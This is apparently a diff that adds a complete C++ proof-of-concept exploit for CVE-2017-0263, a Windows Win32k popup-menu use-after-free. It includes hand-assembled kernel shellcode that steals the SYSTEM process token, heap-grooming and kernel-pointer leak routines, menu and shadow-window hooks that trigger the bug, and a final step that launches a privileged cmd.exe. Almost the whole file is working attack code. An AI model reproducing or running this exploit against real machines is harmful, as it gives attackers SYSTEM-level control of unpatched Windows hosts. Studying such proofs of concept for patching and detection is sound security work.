@@ -1,0 +1,558 @@
+#include <Windows.h>
+#include <wingdi.h>
+#include <iostream>
+#include <Psapi.h>
+#pragma comment(lib, "psapi.lib")
+
+#define POCDEBUG 0
+
+#if POCDEBUG == 1
+#define POCDEBUG_BREAK() getchar()
+#elif POCDEBUG == 2
+#define POCDEBUG_BREAK() DebugBreak()
+#else
+#define POCDEBUG_BREAK()
+#endif
+
+static PVOID(__fastcall *pfnHMValidateHandle)(HANDLE, BYTE) = NULL;
+
+static constexpr UINT num_PopupMenuCount = 2;
+static constexpr UINT num_WndShadowCount = 3;
+static constexpr UINT num_NtUserMNDragLeave = 0x11EC;
+static constexpr UINT num_offset_WND_pcls = 0x64;
+
+static HMENU hpopupMenu[num_PopupMenuCount] = { 0 };
+static UINT  iMenuCreated  = 0;
+static BOOL  bDoneExploit  = FALSE;
+static DWORD popupMenuRoot = 0;
+static HWND  hWindowMain   = NULL;
+static HWND  hWindowHunt   = NULL;
+static HWND  hWindowList[0x100] = { 0 };
+static UINT  iWindowCount  = 0;
+static PVOID pvHeadFake = NULL;
+static PVOID pvAddrFlags = NULL;
+
+typedef struct _HEAD {
+    HANDLE  h;
+    DWORD   cLockObj;
+} HEAD, *PHEAD;
+
+typedef struct _THROBJHEAD {
+    HEAD    head;
+    PVOID   pti;
+} THROBJHEAD, *PTHROBJHEAD;
+
+typedef struct _DESKHEAD {
+    PVOID   rpdesk;
+    PBYTE   pSelf;
+} DESKHEAD, *PDESKHEAD;
+
+typedef struct _THRDESKHEAD {
+    THROBJHEAD  thread;
+    DESKHEAD    deskhead;
+} THRDESKHEAD, *PTHRDESKHEAD;
+
+typedef struct _SHELLCODE {
+    DWORD reserved;
+    DWORD pid;
+    DWORD off_CLS_lpszMenuName;
+    DWORD off_THREADINFO_ppi;
+    DWORD off_EPROCESS_ActiveLink;
+    DWORD off_EPROCESS_Token;
+    PVOID tagCLS[0x100];
+    BYTE  pfnWindProc[];
+} SHELLCODE, *PSHELLCODE;
+
+static PSHELLCODE pvShellCode = NULL;
+
+// Arguments:
+// [ebp+08h]:pwnd   = pwndWindowHunt;
+// [ebp+0Ch]:msg    = 0x9F9F;
+// [ebp+10h]:wParam = popupMenuRoot;
+// [ebp+14h]:lParam = NULL;
+// In kernel-mode, the first argument is tagWND pwnd.
+static
+BYTE
+xxPayloadWindProc[] = {
+    // Loader+0x108a:
+    // Judge if the `msg` is 0x9f9f value.
+    0x55,                               // push    ebp
+    0x8b, 0xec,                         // mov     ebp,esp
+    0x8b, 0x45, 0x0c,                   // mov     eax,dword ptr [ebp+0Ch]
+    0x3d, 0x9f, 0x9f, 0x00, 0x00,       // cmp     eax,9F9Fh
+    0x0f, 0x85, 0x8d, 0x00, 0x00, 0x00, // jne     Loader+0x1128
+    // Loader+0x109b:
+    // Judge if CS is 0x1b, which means in user-mode context.
+    0x66, 0x8c, 0xc8,                   // mov     ax,cs
+    0x66, 0x83, 0xf8, 0x1b,             // cmp     ax,1Bh
+    0x0f, 0x84, 0x80, 0x00, 0x00, 0x00, // je      Loader+0x1128
+    // Loader+0x10a8:
+    // Get the address of pwndWindowHunt to ECX.
+    // Recover the flags of pwndWindowHunt: zero bServerSideWindowProc.
+    // Get the address of pvShellCode to EDX by CALL-POP.
+    // Get the address of pvShellCode->tagCLS[0x100] to ESI.
+    // Get the address of popupMenuRoot to EDI.
+    0xfc,                               // cld
+    0x8b, 0x4d, 0x08,                   // mov     ecx,dword ptr [ebp+8]
+    0xff, 0x41, 0x16,                   // inc     dword ptr [ecx+16h]
+    0x60,                               // pushad
+    0xe8, 0x00, 0x00, 0x00, 0x00,       // call    $5
+    0x5a,                               // pop     edx
+    0x81, 0xea, 0x43, 0x04, 0x00, 0x00, // sub     edx,443h
+    0xbb, 0x00, 0x01, 0x00, 0x00,       // mov     ebx,100h
+    0x8d, 0x72, 0x18,                   // lea     esi,[edx+18h]
+    0x8b, 0x7d, 0x10,                   // mov     edi,dword ptr [ebp+10h]
+    // Loader+0x10c7:
+    0x85, 0xdb,                         // test    ebx,ebx
+    0x74, 0x13,                         // je      Loader+0x10de
+    // Loader+0x10cb:
+    // Judge if pvShellCode->tagCLS[ebx] == NULL
+    0xad,                               // lods    dword ptr [esi]
+    0x4b,                               // dec     ebx
+    0x83, 0xf8, 0x00,                   // cmp     eax,0
+    0x74, 0xf5,                         // je      Loader+0x10c7
+    // Loader+0x10d2:
+    // Judge if tagCLS->lpszMenuName == popupMenuRoot
+    0x03, 0x42, 0x08,                   // add     eax,dword ptr [edx+8]
+    0x39, 0x38,                         // cmp     dword ptr [eax],edi
+    0x75, 0xee,                         // jne     Loader+0x10c7
+    // Loader+0x10d9:
+    // Zero tagCLS->lpszMenuName
+    0x83, 0x20, 0x00,                   // and     dword ptr [eax],0
+    0xeb, 0xe9,                         // jmp     Loader+0x10c7
+    // Loader+0x10de:
+    // Get the value of pwndWindowHunt->head.pti->ppi->Process to ECX.
+    // Get the value of pvShellCode->pid to EAX.
+    0x8b, 0x49, 0x08,                   // mov     ecx,dword ptr [ecx+8]
+    0x8b, 0x5a, 0x0c,                   // mov     ebx,dword ptr [edx+0Ch]
+    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
+    0x8b, 0x09,                         // mov     ecx,dword ptr [ecx]
+    0x8b, 0x5a, 0x10,                   // mov     ebx,dword ptr [edx+10h]
+    0x8b, 0x42, 0x04,                   // mov     eax,dword ptr [edx+4]
+    0x51,                               // push    ecx
+    // Loader+0x10f0:
+    // Judge if EPROCESS->UniqueId == pid.
+    0x39, 0x44, 0x0b, 0xfc,             // cmp     dword ptr [ebx+ecx-4],eax
+    0x74, 0x07,                         // je      Loader+0x10fd
+    // Loader+0x10f6:
+    // Get next EPROCESS to ECX by ActiveLink.
+    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
+    0x2b, 0xcb,                         // sub     ecx,ebx
+    0xeb, 0xf3,                         // jmp     Loader+0x10f0
+    // Loader+0x10fd:
+    // Get current EPROCESS to EDI.
+    0x8b, 0xf9,                         // mov     edi,ecx
+    0x59,                               // pop     ecx
+    // Loader+0x1100:
+    // Judge if EPROCESS->UniqueId == 4
+    0x83, 0x7c, 0x0b, 0xfc, 0x04,       // cmp     dword ptr [ebx+ecx-4],4
+    0x74, 0x07,                         // je      Loader+0x110e
+    // Loader+0x1107:
+    // Get next EPROCESS to ECX by ActiveLink.
+    0x8b, 0x0c, 0x0b,                   // mov     ecx,dword ptr [ebx+ecx]
+    0x2b, 0xcb,                         // sub     ecx,ebx
+    0xeb, 0xf2,                         // jmp     Loader+0x1100
+    // Loader+0x110e:
+    // Get system EPROCESS to ESI.
+    // Get the value of system EPROCESS->Token to current EPROCESS->Token.
+    // Add 2 to OBJECT_HEADER->PointerCount of system Token.
+    // Return 0x9F9F to the caller.
+    0x8b, 0xf1,                         // mov     esi,ecx
+    0x8b, 0x42, 0x14,                   // mov     eax,dword ptr [edx+14h]
+    0x03, 0xf0,                         // add     esi,eax
+    0x03, 0xf8,                         // add     edi,eax
+    0xad,                               // lods    dword ptr [esi]
+    0xab,                               // stos    dword ptr es:[edi]
+    0x83, 0xe0, 0xf8,                   // and     eax,0FFFFFFF8h
+    0x83, 0x40, 0xe8, 0x02,             // add     dword ptr [eax-18h],2
+    0x61,                               // popad
+    0xb8, 0x9f, 0x9f, 0x00, 0x00,       // mov     eax,9F9Fh
+    0xeb, 0x05,                         // jmp     Loader+0x112d
+    // Loader+0x1128:
+    // Failed in processing.
+    0xb8, 0x01, 0x00, 0x00, 0x00,       // mov     eax,1
+    // Loader+0x112d:
+    0xc9,                               // leave
+    0xc2, 0x10, 0x00,                   // ret     10h
+};
+
+static
+VOID
+xxGetHMValidateHandle(VOID)
+{
+    HMODULE hModule = LoadLibraryA("USER32.DLL");
+    PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, "IsMenu");
+    PBYTE Address = NULL;
+    for (INT i = 0; i < 0x30; i++)
+    {
+        if (*(WORD *)(i + pfnIsMenu) != 0x02B2)
+        {
+            continue;
+        }
+        i += 2;
+        if (*(BYTE *)(i + pfnIsMenu) != 0xE8)
+        {
+            continue;
+        }
+        Address = *(DWORD *)(i + pfnIsMenu + 1) + pfnIsMenu;
+        Address = Address + i + 5;
+        pfnHMValidateHandle = (PVOID(__fastcall *)(HANDLE, BYTE))Address;
+        break;
+    }
+}
+
+#define TYPE_WINDOW 1
+
+static
+PVOID
+xxHMValidateHandleEx(HWND hwnd)
+{
+    return pfnHMValidateHandle((HANDLE)hwnd, TYPE_WINDOW);
+}
+
+static
+PVOID
+xxHMValidateHandle(HWND hwnd)
+{
+    PVOID RetAddr = NULL;
+    if (!pfnHMValidateHandle)
+    {
+        xxGetHMValidateHandle();
+    }
+    if (pfnHMValidateHandle)
+    {
+        RetAddr = xxHMValidateHandleEx(hwnd);
+    }
+    return RetAddr;
+}
+
+static
+ULONG_PTR
+xxSyscall(UINT num, ULONG_PTR param1, ULONG_PTR param2)
+{
+    __asm { mov eax, num };
+    __asm { int 2eh };
+}
+
+static
+LRESULT
+WINAPI
+xxShadowWindowProc(
+    _In_ HWND   hwnd,
+    _In_ UINT   msg,
+    _In_ WPARAM wParam,
+    _In_ LPARAM lParam
+)
+{
+    if (msg != WM_NCDESTROY || bDoneExploit)
+    {
+        return DefWindowProcW(hwnd, msg, wParam, lParam);
+    }
+    std::cout << "::" << __FUNCTION__ << std::endl;
+    POCDEBUG_BREAK();
+    DWORD dwPopupFake[0xD] = { 0 };
+    dwPopupFake[0x0] = (DWORD)0x00098208;  //->flags
+    dwPopupFake[0x1] = (DWORD)pvHeadFake;  //->spwndNotify
+    dwPopupFake[0x2] = (DWORD)pvHeadFake;  //->spwndPopupMenu
+    dwPopupFake[0x3] = (DWORD)pvHeadFake;  //->spwndNextPopup
+    dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup
+    dwPopupFake[0x5] = (DWORD)pvHeadFake;  //->spmenu
+    dwPopupFake[0x6] = (DWORD)pvHeadFake;  //->spmenuAlternate
+    dwPopupFake[0x7] = (DWORD)pvHeadFake;  //->spwndActivePopup
+    dwPopupFake[0x8] = (DWORD)0xFFFFFFFF;  //->ppopupmenuRoot
+    dwPopupFake[0x9] = (DWORD)pvHeadFake;  //->ppmDelayedFree
+    dwPopupFake[0xA] = (DWORD)0xFFFFFFFF;  //->posSelectedItem
+    dwPopupFake[0xB] = (DWORD)pvHeadFake;  //->posDropped
+    dwPopupFake[0xC] = (DWORD)0;
+    for (UINT i = 0; i < iWindowCount; ++i)
+    {
+        SetClassLongW(hWindowList[i], GCL_MENUNAME, (LONG)dwPopupFake);
+    }
+    xxSyscall(num_NtUserMNDragLeave, 0, 0);
+    LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0);
+    bDoneExploit = Triggered == 0x9F9F;
+    return DefWindowProcW(hwnd, msg, wParam, lParam);
+}
+
+#define MENUCLASS_NAME L"#32768"
+
+static
+LRESULT
+CALLBACK
+xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
+{
+    tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
+    static HWND hwndMenuHit = 0;
+    static UINT iShadowCount = 0;
+
+    if (bDoneExploit || iMenuCreated != num_PopupMenuCount - 2 || cwp->message != WM_NCCREATE)
+    {
+        return CallNextHookEx(0, code, wParam, lParam);
+    }
+    std::cout << "::" << __FUNCTION__ << std::endl;
+    WCHAR szTemp[0x20] = { 0 };
+    GetClassNameW(cwp->hwnd, szTemp, 0x14);
+    if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)
+    {
+        std::cout << "::iShadowCount=" << iShadowCount << std::endl;
+        POCDEBUG_BREAK();
+        if (++iShadowCount == num_WndShadowCount)
+        {
+            SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
+        }
+        else
+        {
+            SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW);
+            SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW);
+        }
+    }
+    else if (!wcscmp(szTemp, MENUCLASS_NAME))
+    {
+        hwndMenuHit = cwp->hwnd;
+        std::cout << "::hwndMenuHit=" << hwndMenuHit << std::endl;
+    }
+    return CallNextHookEx(0, code, wParam, lParam);
+}
+
+#define MN_ENDMENU 0x1F3
+
+static
+VOID
+CALLBACK
+xxWindowEventProc(
+    HWINEVENTHOOK hWinEventHook,
+    DWORD         event,
+    HWND          hwnd,
+    LONG          idObject,
+    LONG          idChild,
+    DWORD         idEventThread,
+    DWORD         dwmsEventTime
+)
+{
+    UNREFERENCED_PARAMETER(hWinEventHook);
+    UNREFERENCED_PARAMETER(event);
+    UNREFERENCED_PARAMETER(idObject);
+    UNREFERENCED_PARAMETER(idChild);
+    UNREFERENCED_PARAMETER(idEventThread);
+    UNREFERENCED_PARAMETER(dwmsEventTime);
+    std::cout << "::" << __FUNCTION__ << std::endl;
+    if (iMenuCreated == 0)
+    {
+        popupMenuRoot = *(DWORD *)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0);
+    }
+    if (++iMenuCreated >= num_PopupMenuCount)
+    {
+        std::cout << ">>SendMessage(MN_ENDMENU)" << std::endl;
+        POCDEBUG_BREAK();
+        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
+    }
+    else
+    {
+        std::cout << ">>SendMessage(WM_LBUTTONDOWN)" << std::endl;
+        POCDEBUG_BREAK();
+        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002);
+    }
+}
+
+static
+BOOL
+xxRegisterWindowClassW(LPCWSTR lpszClassName, INT cbWndExtra)
+{
+    WNDCLASSEXW wndClass = { 0 };
+    wndClass = { 0 };
+    wndClass.cbSize = sizeof(WNDCLASSEXW);
+    wndClass.lpfnWndProc    = DefWindowProcW;
+    wndClass.cbWndExtra     = cbWndExtra;
+    wndClass.hInstance      = GetModuleHandleA(NULL);
+    wndClass.lpszMenuName   = NULL;
+    wndClass.lpszClassName  = lpszClassName;
+    return RegisterClassExW(&wndClass);
+}
+
+static
+HWND
+xxCreateWindowExW(LPCWSTR lpszClassName, DWORD dwExStyle, DWORD dwStyle)
+{
+    return CreateWindowExW(dwExStyle,
+        lpszClassName,
+        NULL,
+        dwStyle,
+        0,
+        0,
+        1,
+        1,
+        NULL,
+        NULL,
+        GetModuleHandleA(NULL),
+        NULL);
+}
+
+static
+VOID xxCreateCmdLineProcess(VOID)
+{
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+    WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
+}
+
+static
+DWORD
+WINAPI
+xxTrackExploitEx(LPVOID lpThreadParameter)
+{
+    UNREFERENCED_PARAMETER(lpThreadParameter);
+    std::cout << "::" << __FUNCTION__ << std::endl;
+    POCDEBUG_BREAK();
+
+    for (INT i = 0; i < num_PopupMenuCount; i++)
+    {
+        MENUINFO mi = { 0 };
+        hpopupMenu[i]  = CreatePopupMenu();
+        mi.cbSize  = sizeof(mi);
+        mi.fMask   = MIM_STYLE;
+        mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;
+        SetMenuInfo(hpopupMenu[i], &mi);
+    }
+    for (INT i = 0; i < num_PopupMenuCount; i++)
+    {
+        LPCSTR szMenuItem = "item";
+        AppendMenuA(hpopupMenu[i],
+            MF_BYPOSITION | MF_POPUP,
+            (i >= num_PopupMenuCount - 1) ? 0 : (UINT_PTR)hpopupMenu[i + 1],
+            szMenuItem);
+    }
+
+    for (INT i = 0; i < 0x100; i++)
+    {
+        WNDCLASSEXW Class = { 0 };
+        WCHAR szTemp[20] = { 0 };
+        HWND hwnd = NULL;
+        wsprintfW(szTemp, L"%x-%d", rand(), i);
+        Class.cbSize        = sizeof(WNDCLASSEXA);
+        Class.lpfnWndProc   = DefWindowProcW;
+        Class.cbWndExtra    = 0;
+        Class.hInstance     = GetModuleHandleA(NULL);
+        Class.lpszMenuName  = NULL;
+        Class.lpszClassName = szTemp;
+        if (!RegisterClassExW(&Class))
+        {
+            continue;
+        }
+        hwnd = CreateWindowExW(0, szTemp, NULL, WS_OVERLAPPED,
+            0,
+            0,
+            0,
+            0,
+            NULL,
+            NULL,
+            GetModuleHandleA(NULL),
+            NULL);
+        if (hwnd == NULL)
+        {
+            continue;
+        }
+        hWindowList[iWindowCount++] = hwnd;
+    }
+    for (INT i = 0; i < iWindowCount; i++)
+    {
+        pvShellCode->tagCLS[i] = *(PVOID *)((PBYTE)xxHMValidateHandle(hWindowList[i]) + num_offset_WND_pcls);
+    }
+
+    DWORD fOldProtect = 0;
+    VirtualProtect(pvShellCode, 0x1000, PAGE_EXECUTE_READ, &fOldProtect);
+
+    xxRegisterWindowClassW(L"WNDCLASSMAIN", 0x000);
+    hWindowMain = xxCreateWindowExW(L"WNDCLASSMAIN",
+        WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
+        WS_VISIBLE);
+    xxRegisterWindowClassW(L"WNDCLASSHUNT", 0x200);
+    hWindowHunt = xxCreateWindowExW(L"WNDCLASSHUNT",
+        WS_EX_LEFT,
+        WS_OVERLAPPED);
+    PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hWindowHunt);
+    PBYTE pbExtra = head->deskhead.pSelf + 0xb0 + 4;
+    pvHeadFake = pbExtra + 0x44;
+    for (UINT x = 0; x < 0x7F; x++)
+    {
+        SetWindowLongW(hWindowHunt, sizeof(DWORD) * (x + 1), (LONG)pbExtra);
+    }
+    PVOID pti = head->thread.pti;
+    SetWindowLongW(hWindowHunt, 0x28, 0);
+    SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti
+    SetWindowLongW(hWindowHunt, 0x6C, 0);
+    SetWindowLongW(hWindowHunt, 0x1F8, 0xC033C033);
+    SetWindowLongW(hWindowHunt, 0x1FC, 0xFFFFFFFF);
+
+    pvAddrFlags = *(PBYTE *)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;
+
+    SetWindowLongW(hWindowHunt, GWL_WNDPROC, (LONG)pvShellCode->pfnWindProc);
+
+    SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,
+        GetModuleHandleA(NULL),
+        GetCurrentThreadId());
+
+    SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
+        GetModuleHandleA(NULL),
+        xxWindowEventProc,
+        GetCurrentProcessId(),
+        GetCurrentThreadId(),
+        0);
+
+    TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);
+
+    MSG msg = { 0 };
+    while (GetMessageW(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+    }
+    return 0;
+}
+
+INT POC_CVE20170263(VOID)
+{
+    std::cout << "-------------------" << std::endl;
+    std::cout << "POC - CVE-2017-0263" << std::endl;
+    std::cout << "-------------------" << std::endl;
+
+    pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (pvShellCode == NULL)
+    {
+        return 0;
+    }
+    ZeroMemory(pvShellCode, 0x1000);
+    pvShellCode->pid = GetCurrentProcessId();
+    pvShellCode->off_CLS_lpszMenuName    = 0x050;
+    pvShellCode->off_THREADINFO_ppi      = 0x0b8;
+    pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
+    pvShellCode->off_EPROCESS_Token      = 0x0f8;
+    CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc));
+
+    std::cout << "CREATE WORKER THREAD..." << std::endl;
+    POCDEBUG_BREAK();
+    HANDLE hThread = CreateThread(NULL, 0, xxTrackExploitEx, NULL, 0, NULL);
+    if (hThread == NULL)
+    {
+        return FALSE;
+    }
+    while (!bDoneExploit)
+    {
+        Sleep(500);
+    }
+    xxCreateCmdLineProcess();
+    DestroyWindow(hWindowMain);
+    TerminateThread(hThread, 0);
+    std::cout << "-------------------" << std::endl;
+    getchar();
+    return bDoneExploit;
+}
+
+INT main(INT argc, CHAR *argv[])
+{
+    POC_CVE20170263();
+    return 0;
+}
